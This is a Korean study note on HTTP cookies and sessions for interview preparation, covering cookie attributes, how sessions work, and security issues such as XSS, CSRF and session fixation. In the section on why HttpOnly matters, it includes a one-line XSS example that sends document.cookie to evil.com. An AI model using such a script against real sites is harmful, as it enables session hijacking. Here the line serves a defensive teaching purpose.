#network #http #cookie #session #상태관리 #인증 #면접 #개념정리

**관련 개념:** [[HTTP와 HTTPS의 차이점]] [[GET과 POST (HTTP 메서드와 데이터 흐름)]] [[세션 로그인 vs JWT 토큰 로그인]]

> [!note] 이어서 읽기
> 쿠키와 세션은 HTTP의 상태 없는(Stateless) 특성을 보완하기 위한 메커니즘입니다. [[HTTP와 HTTPS의 차이점]]을 함께 확인하세요.

---

## Topic (오늘의 주제)

**쿠키(Cookie)**와 **세션(Session)**은 HTTP의 상태 없는(Stateless) 특성을 보완하여 사용자 상태를 유지하기 위한 메커니즘입니다. 쿠키는 클라이언트(브라우저)에 저장되는 작은 데이터 조각을 저장하고, 세션은 서버에 사용자 정보를 저장하고 세션 ID를 쿠키로 전달하는 방식입니다.

---

### **Why (왜 사용하는가? 왜 중요한가?)**

- HTTP는 상태 없는(Stateless) 프로토콜이므로 각 요청은 독립적입니다. 로그인 상태 유지, 장바구니, 사용자 설정 등을 위해서는 쿠키와 세션이 필요합니다. 쿠키와 세션을 이해하지 못하면 사용자 인증, 상태 관리, 보안 문제를 해결할 수 없습니다.

- 쿠키와 세션의 차이점(저장 위치, 보안, 용량 제한), 쿠키의 속성(HttpOnly, Secure, SameSite), 세션의 동작 원리, 그리고 각각의 사용 사례와 보안 고려사항을 이해해야 합니다.

---

## 1. HTTP의 Stateless 특성

### **Stateless란?**

**HTTP는 Stateless(상태 없음) 프로토콜**입니다. 즉, 각 HTTP 요청은 이전 요청과 독립적이며, 서버는 이전 요청의 정보를 기억하지 않습니다.

**예시:**
```
요청 1: GET /login?id=user1
요청 2: GET /profile
[서버는 요청 1의 정보를 기억하지 않음]
```

**문제점:**
- 로그인 상태를 유지할 수 없음
- 장바구니에 담은 상품을 기억할 수 없음
- 사용자 설정을 저장할 수 없음

**해결 방법:**
- **쿠키(Cookie)**: 클라이언트에 데이터 저장
- **세션(Session)**: 서버에 데이터 저장, 세션 ID를 쿠키로 전달

---

## 2. 쿠키(Cookie)란?

### **쿠키의 정의**

**쿠키(Cookie)**는 서버가 클라이언트(브라우저)에 저장하는 작은 데이터 조각입니다. 브라우저는 이후 요청에 쿠키를 자동으로 포함하여 전송합니다.

### **쿠키의 주요 특징**

1. **클라이언트에 저장**
   - 브라우저의 쿠키 저장소에 저장
   - 서버가 아닌 클라이언트 측에 데이터 보관

2. **자동 전송**
   - 브라우저가 요청 시 자동으로 쿠키를 포함
   - 서버가 별도로 요청하지 않아도 전송됨

3. **도메인별 관리**
   - 각 도메인별로 쿠키가 분리되어 저장
   - example.com의 쿠키는 example.com으로만 전송

4. **용량 제한**
   - 쿠키 하나당 최대 4KB
   - 도메인당 약 20개 정도의 쿠키 제한

### **쿠키의 구조**

```
Set-Cookie: name=value; Expires=날짜; Path=/; Domain=example.com; Secure; HttpOnly; SameSite=Strict
```

**주요 속성:**
- **name=value**: 쿠키의 이름과 값
- **Expires/Max-Age**: 쿠키 만료 시간
- **Path**: 쿠키를 전송할 경로
- **Domain**: 쿠키를 전송할 도메인
- **Secure**: HTTPS에서만 전송
- **HttpOnly**: JavaScript 접근 불가
- **SameSite**: CSRF 공격 방지

### **쿠키 설정 예시**

**서버에서 쿠키 설정:**
```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2024 07:28:00 GMT; Path=/; HttpOnly; Secure
Set-Cookie: theme=dark; Max-Age=3600; Path=/
```

**클라이언트가 쿠키 전송:**
```http
GET /profile HTTP/1.1
Host: example.com
Cookie: sessionId=abc123; theme=dark
```

---

## 3. 쿠키의 속성 상세 설명

### **1. Expires / Max-Age**

**만료 시간 설정:**

**Expires:**
```
Expires=Wed, 21 Oct 2024 07:28:00 GMT
```
- 절대 시간으로 만료 시점 지정
- 만료되면 브라우저가 쿠키 삭제

**Max-Age:**
```
Max-Age=3600
```
- 상대 시간으로 만료 시점 지정 (초 단위)
- 3600초 = 1시간 후 만료

**만료 시간 없음:**
```
[Expires나 Max-Age 없음]
```
- 세션 쿠키 (Session Cookie)
- 브라우저 종료 시 삭제

### **2. Path**

**쿠키를 전송할 경로 지정:**
```
Path=/
Path=/admin
Path=/api
```

**예시:**
```
Path=/admin
→ /admin, /admin/users, /admin/settings 등에만 쿠키 전송
→ /home에는 쿠키 전송 안 함
```

### **3. Domain**

**쿠키를 전송할 도메인 지정:**
```
Domain=example.com
Domain=.example.com  (서브도메인 포함)
```

**예시:**
```
Domain=.example.com
→ example.com, www.example.com, api.example.com 모두에 쿠키 전송
```

### **4. Secure**

**HTTPS에서만 쿠키 전송:**
```
Secure
```

**보안 효과:**
- HTTP에서는 쿠키 전송 안 함
- HTTPS에서만 쿠키 전송
- 네트워크에서 쿠키 탈취 방지

### **5. HttpOnly**

**JavaScript 접근 불가:**
```
HttpOnly
```

**보안 효과:**
- JavaScript의 `document.cookie`로 접근 불가
- XSS(Cross-Site Scripting) 공격 방지
- 세션 ID 같은 민감한 정보 보호

**예시:**
```javascript
// HttpOnly 쿠키는 접근 불가
document.cookie  // HttpOnly 쿠키는 보이지 않음
```

### **6. SameSite**

**CSRF 공격 방지:**
```
SameSite=Strict    // 같은 사이트에서만 전송
SameSite=Lax       // 일부 외부 요청에서도 전송 (기본값)
SameSite=None      // 모든 요청에서 전송 (Secure 필수)
```

**SameSite=Strict:**
```
example.com에서만 쿠키 전송
다른 사이트에서 example.com으로 요청 시 쿠키 전송 안 함
```

**SameSite=Lax:**
```
GET 요청은 외부에서도 쿠키 전송
POST 요청은 같은 사이트에서만 쿠키 전송
```

**SameSite=None:**
```
모든 요청에서 쿠키 전송
Secure 속성과 함께 사용해야 함
```

---

## 4. 세션(Session)이란?

### **세션의 정의**

**세션(Session)**은 서버에 사용자 정보를 저장하고, 클라이언트에는 세션 ID만 쿠키로 전달하는 방식입니다.

### **세션의 주요 특징**

1. **서버에 데이터 저장**
   - 사용자 정보를 서버 메모리나 데이터베이스에 저장
   - 클라이언트에는 세션 ID만 전달

2. **세션 ID를 쿠키로 전달**
   - 서버가 생성한 고유한 세션 ID
   - 쿠키에 세션 ID를 담아 클라이언트에 전달

3. **보안성**
   - 실제 데이터는 서버에만 저장
   - 클라이언트는 세션 ID만 가지고 있음
   - 세션 ID가 탈취되어도 서버에서 무효화 가능

4. **서버 부하**
   - 서버 메모리나 DB에 세션 정보 저장
   - 세션 조회를 위한 추가 작업 필요

### **세션의 동작 원리**

```
1️⃣ 사용자가 로그인 요청
      ↓
2️⃣ 서버가 사용자 정보 확인
      ↓
3️⃣ 서버가 세션 생성 및 저장
   - 세션 ID 생성 (예: "abc123")
   - 사용자 정보를 세션에 저장
   - 서버 메모리/DB에 세션 저장
      ↓
4️⃣ 서버가 세션 ID를 쿠키로 전달
   Set-Cookie: sessionId=abc123; HttpOnly; Secure
      ↓
5️⃣ 클라이언트가 이후 요청에 쿠키 자동 포함
   Cookie: sessionId=abc123
      ↓
6️⃣ 서버가 세션 ID로 세션 조회
   - 세션 ID로 사용자 정보 조회
   - 인증 상태 확인
```

### **세션 저장 위치**

1. **서버 메모리 (In-Memory)**
   ```
   서버 메모리에 세션 저장
   - 빠른 접근
   - 서버 재시작 시 세션 손실
   - 서버 확장 시 세션 공유 불가
   ```

2. **데이터베이스**
   ```
   DB에 세션 저장
   - 영구 저장
   - 서버 확장 시 세션 공유 가능
   - DB 조회 오버헤드
   ```

3. **Redis (권장)**
   ```
   Redis에 세션 저장
   - 빠른 접근 (메모리 기반)
   - 서버 확장 시 세션 공유 가능
   - 영구 저장 가능
   ```

---

## 5. 쿠키 vs 세션 비교

### **핵심 차이점**

| 구분 | 쿠키 | 세션 |
|:---:|:---:|:---:|
| **저장 위치** | 클라이언트 (브라우저) | 서버 (메모리/DB/Redis) |
| **데이터 크기** | 제한적 (4KB) | 제한 없음 |
| **보안** | 상대적으로 낮음 (클라이언트에 저장) | 높음 (서버에 저장) |
| **서버 부하** | 없음 | 있음 (세션 조회 필요) |
| **용도** | 간단한 설정, 추적 | 인증, 중요한 정보 |
| **만료 시간** | 클라이언트가 관리 | 서버가 관리 |
| **JavaScript 접근** | 가능 (HttpOnly 없을 때) | 불가능 (서버에만 존재) |
| **확장성** | 좋음 (서버 부하 없음) | 제한적 (서버 메모리/DB 의존) |

### **데이터 저장 위치 비교**

**쿠키:**
```
클라이언트                    서버
    |                         |
[쿠키 저장소]                 |
- sessionId=abc123           |
- theme=dark                 |
    |                         |
    |---- Cookie: sessionId=abc123 -->|
    |                         |
```

**세션:**
```
클라이언트                    서버
    |                         |
    |                         | [세션 저장소]
    |                         | - abc123: {userId: 1, ...}
    |                         | - def456: {userId: 2, ...}
    |                         |
    |---- Cookie: sessionId=abc123 -->|
    |                         | [세션 조회]
    |                         | 세션 ID로 사용자 정보 조회
```

---

## 6. 쿠키와 세션의 사용 사례

### **쿠키를 사용하는 경우**

1. **사용자 설정**
   ```
   - 언어 설정 (language=ko)
   - 테마 설정 (theme=dark)
   - 화면 크기 설정
   ```

2. **장바구니 (간단한 경우)**
   ```
   - 상품 ID 목록
   - 간단한 사용자 선호도
   ```

3. **추적 (Tracking)**
   ```
   - 방문 횟수
   - 마지막 방문 시간
   - 광고 추적
   ```

4. **세션 ID 저장**
   ```
   - 세션 ID를 쿠키에 저장
   - 실제 데이터는 서버 세션에 저장
   ```

### **세션을 사용하는 경우**

1. **로그인 인증**
   ```
   - 사용자 ID
   - 권한 정보
   - 로그인 상태
   ```

2. **중요한 정보**
   ```
   - 개인정보
   - 결제 정보
   - 민감한 설정
   ```

3. **임시 데이터**
   ```
   - 폼 데이터 임시 저장
   - 다단계 프로세스 상태
   ```

---

## 7. 쿠키와 세션의 보안 고려사항

### **쿠키의 보안 문제**

1. **XSS 공격 (Cross-Site Scripting)**
   ```
   공격자가 악성 스크립트를 주입
   → JavaScript로 쿠키 탈취
   ```

   **해결:**
   - HttpOnly 속성 사용
   - XSS 공격 방지 (입력 검증, 출력 인코딩)

2. **CSRF 공격 (Cross-Site Request Forgery)**
   ```
   공격자가 다른 사이트에서 요청
   → 쿠키가 자동으로 포함되어 전송
   ```

   **해결:**
   - SameSite 속성 사용
   - CSRF 토큰 사용

3. **쿠키 탈취**
   ```
   네트워크에서 쿠키 가로채기
   ```

   **해결:**
   - Secure 속성 사용 (HTTPS만)
   - HTTPS 사용

### **세션의 보안 문제**

1. **세션 하이재킹 (Session Hijacking)**
   ```
   세션 ID 탈취
   → 공격자가 세션 ID로 인증 우회
   ```

   **해결:**
   - HTTPS 사용
   - HttpOnly 쿠키 사용
   - 세션 ID 주기적 변경
   - IP 주소 확인

2. **세션 고정 공격 (Session Fixation)**
   ```
   공격자가 세션 ID를 미리 알고 있음
   → 사용자가 그 세션 ID로 로그인
   → 공격자가 세션 ID로 접근
   ```

   **해결:**
   - 로그인 시 세션 ID 재생성
   - 권한 변경 시 세션 ID 재생성

3. **세션 만료 관리**
   ```
   세션이 만료되지 않음
   → 장기간 유효한 세션
   ```

   **해결:**
   - 적절한 세션 만료 시간 설정
   - 비활성 시간 기반 만료

---

## 8. 쿠키와 세션의 실제 동작 예시

### **로그인 프로세스 (세션 사용)**

```
1. 사용자가 로그인 요청
   POST /login
   {
     "username": "user1",
     "password": "password123"
   }

2. 서버가 인증 확인 후 세션 생성
   - 세션 ID 생성: "sess_abc123"
   - 세션에 저장: {userId: 1, username: "user1", role: "user"}
   - 세션을 서버 메모리/DB에 저장

3. 서버가 세션 ID를 쿠키로 전송
   HTTP/1.1 200 OK
   Set-Cookie: sessionId=sess_abc123; HttpOnly; Secure; SameSite=Strict

4. 클라이언트가 이후 요청에 쿠키 포함
   GET /profile
   Cookie: sessionId=sess_abc123

5. 서버가 세션 조회
   - 세션 ID로 세션 조회
   - 사용자 정보 확인
   - 인증된 사용자로 처리
```

### **테마 설정 (쿠키 사용)**

```
1. 사용자가 테마 변경
   POST /settings/theme
   {
     "theme": "dark"
   }

2. 서버가 쿠키 설정
   HTTP/1.1 200 OK
   Set-Cookie: theme=dark; Max-Age=31536000; Path=/

3. 클라이언트가 이후 요청에 쿠키 포함
   GET /home
   Cookie: theme=dark

4. 서버가 테마 정보 사용
   - 쿠키에서 theme 읽기
   - 다크 테마로 응답
```

---

## 9. 쿠키와 세션의 최적화

### **쿠키 최적화**

1. **필요한 쿠키만 사용**
   - 불필요한 쿠키는 제거
   - 쿠키 크기 최소화

2. **적절한 만료 시간 설정**
   - 영구 쿠키는 필요한 경우만
   - 세션 쿠키는 브라우저 종료 시 삭제

3. **도메인과 경로 최적화**
   - 필요한 경로에만 쿠키 전송
   - 불필요한 도메인에 쿠키 전송 방지

### **세션 최적화**

1. **세션 저장소 선택**
   - Redis 사용 (빠른 접근, 확장성)
   - DB는 필요한 경우만

2. **세션 만료 시간 설정**
   - 적절한 만료 시간 설정
   - 비활성 시간 기반 만료

3. **세션 정리**
   - 만료된 세션 정기적 삭제
   - 메모리 누수 방지

---

## 요약

- **쿠키**는 클라이언트(브라우저)에 저장되는 작은 데이터 조각으로, 브라우저가 자동으로 요청에 포함하여 전송합니다. 용량 제한(4KB)이 있고, HttpOnly, Secure, SameSite 속성으로 보안을 강화할 수 있습니다.

- **세션**은 서버에 사용자 정보를 저장하고, 클라이언트에는 세션 ID만 쿠키로 전달하는 방식입니다. 실제 데이터는 서버에 저장되어 보안성이 높지만, 서버 부하와 확장성 문제가 있을 수 있습니다.

- **쿠키**는 간단한 설정, 추적에 사용하고, **세션**은 로그인 인증, 중요한 정보 저장에 사용합니다. 세션 ID는 보통 쿠키에 저장하여 전달합니다.

- **보안**: 쿠키는 HttpOnly, Secure, SameSite 속성을 사용하고, 세션은 HTTPS 사용, 세션 ID 재생성, 적절한 만료 시간 설정이 중요합니다.

---

## 참고 자료

- [RFC 6265 - HTTP State Management Mechanism (Cookies)](https://tools.ietf.org/html/rfc6265)
- [MDN Web Docs - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP - Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

### 예상 꼬리질문 정리

#### 1. 쿠키와 세션을 함께 사용하는 경우는?

**일반적인 패턴:**
- 세션 ID를 쿠키에 저장
- 실제 사용자 정보는 서버 세션에 저장

**예시:**
```
서버가 세션 생성
  → 세션 ID: "sess_abc123"
  → 세션에 저장: {userId: 1, username: "user1"}

쿠키에 세션 ID 저장
  Set-Cookie: sessionId=sess_abc123; HttpOnly; Secure

클라이언트는 세션 ID만 가지고 있음
서버는 세션 ID로 사용자 정보 조회
```

**장점:**
- 보안성: 실제 데이터는 서버에만 저장
- 효율성: 쿠키는 작은 세션 ID만 저장

#### 2. 쿠키 없이 세션을 사용할 수 있나?

**가능하지만 비효율적:**

1. **URL 파라미터로 세션 ID 전달**
   ```
   GET /profile?sessionId=abc123
   ```
   - 문제점: URL에 노출, 브라우저 히스토리에 저장, 공유 시 세션 ID 노출

2. **Hidden Form Field**
   ```
   <input type="hidden" name="sessionId" value="abc123">
   ```
   - 문제점: 모든 폼에 포함 필요, 복잡함

3. **Authorization 헤더**
   ```
   Authorization: Session abc123
   ```
   - 문제점: 브라우저가 자동으로 포함하지 않음, 수동 설정 필요

**결론:**
- 쿠키가 가장 편리하고 안전한 방법
- HttpOnly, Secure 속성으로 보안 강화

#### 3. 세션을 서버 메모리에 저장하면 어떤 문제가 있나?

**문제점:**

1. **서버 재시작 시 세션 손실**
   ```
   서버 재시작 → 메모리 초기화 → 모든 세션 삭제
   → 사용자가 다시 로그인해야 함
   ```

2. **서버 확장 시 세션 공유 불가**
   ```
   서버 1: 세션 A 저장
   서버 2: 세션 A 없음
   → 로드 밸런서가 서버 2로 요청 라우팅
   → 세션을 찾을 수 없음
   ```

3. **메모리 부족**
   ```
   많은 사용자 → 많은 세션 → 메모리 부족
   → 서버 다운 가능
   ```

**해결 방법:**
- Redis 같은 외부 저장소 사용
- 세션 클러스터링
- Sticky Session (같은 서버로 라우팅)

#### 4. 쿠키의 SameSite 속성은 어떻게 동작하나?

**SameSite=Strict:**
```
example.com에서만 쿠키 전송
다른 사이트에서 example.com으로 요청 시 쿠키 전송 안 함

예시:
- example.com → example.com: 쿠키 전송 ✅
- evil.com → example.com: 쿠키 전송 안 함 ❌
```

**SameSite=Lax (기본값):**
```
GET 요청은 외부에서도 쿠키 전송
POST 요청은 같은 사이트에서만 쿠키 전송

예시:
- evil.com → example.com (GET): 쿠키 전송 ✅
- evil.com → example.com (POST): 쿠키 전송 안 함 ❌
```

**SameSite=None:**
```
모든 요청에서 쿠키 전송
Secure 속성과 함께 사용해야 함

예시:
- 모든 사이트에서 쿠키 전송 ✅
- Secure 필수 (HTTPS만)
```

**CSRF 공격 방지:**
- SameSite=Strict 또는 Lax 사용
- 외부 사이트에서의 요청 시 쿠키 전송 방지

#### 5. 세션과 JWT 토큰의 차이는?

| 구분 | 세션 | JWT 토큰 |
|:---:|:---:|:---:|
| **저장 위치** | 서버 | 클라이언트 |
| **상태 관리** | Stateful (서버가 상태 유지) | Stateless (서버는 상태 없음) |
| **확장성** | 제한적 (서버 메모리/DB 의존) | 좋음 (서버 확장 용이) |
| **즉시 무효화** | 가능 (세션 삭제) | 어려움 (토큰 만료까지 유효) |
| **데이터 크기** | 제한 없음 | 제한적 (토큰 크기 증가) |
| **보안** | 높음 (서버 제어 가능) | 중간 (토큰 탈취 위험) |

**세션:**
- 서버에 사용자 정보 저장
- 세션 ID만 클라이언트에 전달
- 서버에서 즉시 무효화 가능

**JWT:**
- 사용자 정보를 토큰에 포함
- 클라이언트가 토큰 보관
- 서버 확장 용이

자세한 내용은 [[세션 로그인 vs JWT 토큰 로그인]]을 참고하세요.

#### 6. 쿠키의 HttpOnly 속성은 왜 중요한가?

**HttpOnly 없을 때:**
```javascript
// JavaScript로 쿠키 접근 가능
document.cookie  // "sessionId=abc123; theme=dark"

// XSS 공격 시 쿠키 탈취 가능
<script>
  // 악성 스크립트
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```

**HttpOnly 사용 시:**
```javascript
// JavaScript로 쿠키 접근 불가
document.cookie  // HttpOnly 쿠키는 보이지 않음

// XSS 공격 시에도 쿠키 탈취 불가
```

**보안 효과:**
- XSS 공격으로부터 쿠키 보호
- 세션 ID 같은 민감한 정보 보호
- JavaScript 접근 완전 차단

**권장:**
- 세션 ID는 반드시 HttpOnly 사용
- 민감한 정보는 HttpOnly 쿠키 사용

#### 7. 세션 만료 시간은 어떻게 설정하나?

**적절한 만료 시간 설정:**

1. **활성 시간 기반 (Idle Timeout)**
   ```
   마지막 요청 후 30분 경과 → 세션 만료
   ```
   - 사용자가 활동하지 않으면 세션 만료
   - 보안성 높음

2. **절대 시간 기반 (Absolute Timeout)**
   ```
   로그인 후 24시간 경과 → 세션 만료
   ```
   - 로그인 시간 기준으로 만료
   - 일정 시간 후 강제 만료

3. **하이브리드 방식**
   ```
   활성 시간: 30분
   절대 시간: 24시간
   → 둘 중 하나라도 만료되면 세션 만료
   ```

**설정 예시:**
```java
// Spring Boot
server.servlet.session.timeout=30m  // 30분
server.servlet.session.cookie.max-age=1800  // 30분 (초)
```

**권장:**
- 일반 사용자: 30분 ~ 1시간
- 관리자: 15분 ~ 30분
- 금융 서비스: 5분 ~ 15분

---

## 관련 노트

- **[[HTTP와 HTTPS의 차이점]]** - HTTP 프로토콜의 보안
- **[[GET과 POST (HTTP 메서드와 데이터 흐름)]]** - HTTP 메서드
- **[[세션 로그인 vs JWT 토큰 로그인]]** - 인증 방식 비교

---

**태그:** #network #http #cookie #session #상태관리 #인증 #면접 #개념정리
